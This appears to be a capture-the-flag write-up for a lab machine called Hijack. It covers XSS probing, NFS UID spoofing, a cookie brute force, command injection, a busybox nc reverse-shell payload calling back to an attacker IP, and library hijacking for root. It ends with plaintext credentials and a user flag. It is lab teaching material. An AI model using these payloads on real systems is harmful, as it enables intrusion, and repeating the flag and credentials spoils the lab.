# Hijack
(Flags are at the end of the writeup)

### Deploy the machine and get the flags!
Initial scan finds ports 21,22,80,111,2049,35287,41763,47944,49228 open:


OpenSSH 7.2p2 is vulnerable to [username enumeration](https://www.exploit-db.com/exploits/40136):
Accessing the website, if I create a new account I get a cookie:<br />
![image](https://github.com/user-attachments/assets/07cd2b1c-3a67-4fa3-998b-3555af60dce1)<br />
After further enumeration, I found that the `username` parameter is vulnerable to XSS. To prove it, I tried using `"><script>alert(1)</script>`, and it worked:<br />
![image](https://github.com/user-attachments/assets/556f544c-3bd3-4857-a0cf-f4aa1832e42e)<br />
I then checked the nfs service, the command to mount the shared file system is `sudo mount -t nfs 10.10.246.225:/mnt/share mount -o nolock`<br />
However only user with ID=1003 can access the shared filesystem.<br />
![image](https://github.com/user-attachments/assets/d84ec36c-483b-4c3f-a340-3b988fa4d12b)<br />
So we need to create another user with ID=1003 with `sudo useradd -u 1003 hijack`. Give a password to that user with `sudo passwd nome_utente`
After logging with the new user, I found some FTP credentials:<br />
![image](https://github.com/user-attachments/assets/762f5a5e-ebee-4a1c-97f9-a2bf1db0456f)<br />
Remember to remove the user with `sudo userdel nome_utente`. So I logged in the FTP server and found some other files:<br />
![image](https://github.com/user-attachments/assets/a3237956-df3d-4696-956c-0639f520f66d)<br />
The `passwords_list.txt` file contains, guess what, a list of complex passwords. I think I need to use this list to bruteforce something. So I tried bruteforcing the login page to access the administration panel. 
If you examine the cookie, you can see it's a base64 encoded string with the following format: `user:MD5_hashed_password`. So since we know that a user called `admin` exists, and we have the password list, then we have every ingredient to bruteforce logins.
To do that, I created (thanks, Mr. GPT), a python script called `brutecookie.py` that you can find inside this folder. Remember to change the parameters according to your instance before executing the script.<br />
![image](https://github.com/user-attachments/assets/c9ab8a6d-a882-4a69-9eb2-5298f9d37f4d)<br />
Great, we can now login using this password!<br />
![image](https://github.com/user-attachments/assets/67e4bff7-e207-4bfa-889c-f51bdc05c73f)<br />
It seems like a page to check which services exists on the host. So my guess is that it executes something like `systemctl status example.service`. So I immediatly tought of command injection. `;` gets detected, then I tried `example && whoami` and it worked!<br />
![image](https://github.com/user-attachments/assets/71ccdabd-303e-4378-baf7-483db20e0282)<br />
Time to get a reverse shell. Open a nc listener and run use the following payload `& busybox nc 10.11.108.100 4444 -e sh`.<br />
I immediately found credentials inside `confing.php`:<br />
![image](https://github.com/user-attachments/assets/de2653f1-c3f3-4de4-9502-3117292f4123)<br />
They look like mysql credentials, and I think they are, but I used them to access rick's account through ssh and get the first flag. <br />
Running `sudo -l` we get the following:<br />
![image](https://github.com/user-attachments/assets/a55d25fe-2c56-4435-8deb-e636213e3087)<br />
We can execute a binary called `apache2` and have also access to the LD_LIBRARY_PATH. LD_LIBRARY_PATH allows us to specify where the program should go look for shared libraries/objects first. So the idea is to take the name of any of the libraries used by the `apache2` binary, and create a malicious script with that exact name inside a folder that we have access to. <br />
![image](https://github.com/user-attachments/assets/b773529e-1c80-48a9-94b5-35e06b3946a8)<br />
I'm gonna take `libpcre.so.3`. So, first of all, create the malicious .c file; you can find it inside this folder, called `exploit.c`. Then, compile it using the following command: `gcc -o /tmp/libcre.so.3 -shared -fPIC exploit.c`.





rick:N3v3rG0nn4G1v3Y0uUp
admin:uDh3jCQsdcuLhjVkAy5x
ftpuser:W3stV1rg1n14M0un741nM4m4

- What is the user flag? `THM{fdc8cd4cff2c19e0d1022e78481ddf36}`
- What is the root flag?
